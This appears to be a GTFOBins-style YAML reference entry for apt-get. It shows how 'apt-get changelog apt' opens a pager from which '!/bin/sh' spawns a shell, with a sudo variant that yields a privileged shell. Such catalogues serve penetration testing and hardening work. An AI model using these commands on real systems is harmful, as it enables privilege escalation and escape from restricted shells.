---
description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
functions:
  execute-interactive:
    - code: |
        apt-get changelog apt
        !/bin/sh
  sudo-enabled:
    - code: |
        sudo apt-get changelog apt
        !/bin/sh
---
